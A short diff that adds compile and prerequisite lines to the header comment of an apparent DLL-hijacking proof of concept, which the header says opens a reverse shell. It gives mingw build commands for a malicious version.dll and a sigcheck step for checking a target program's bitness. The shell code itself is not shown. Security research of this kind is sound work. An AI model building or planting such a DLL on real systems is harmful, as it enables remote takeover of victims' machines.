@@ -2,9 +2,12 @@
 Name        : version-reverse.c
 Description : DLL Hijacking PoC that creates a reverse shell.
 Compile 64  : x86_64-w64-mingw32-gcc -shared -o version.dll version-reverse.c -lws2_32 -fPIC
+Compile 32  : i686-w64-mingw32-gcc -shared -o version.dll version.c -lws2_32 -fPIC
 Examples    : C:\Windows\System32\systeminfo.exe (64-bit)
 Author      : Lisandre.com
 Date        : 2025-04-17
+Prereq      : Run sigcheck from Sysinternals to know if the app is 32-bit or 64-bit
+              sigcheck.exe VulnerableApp.exe
 */
 #include <winsock2.h>
 #include <stdio.h>
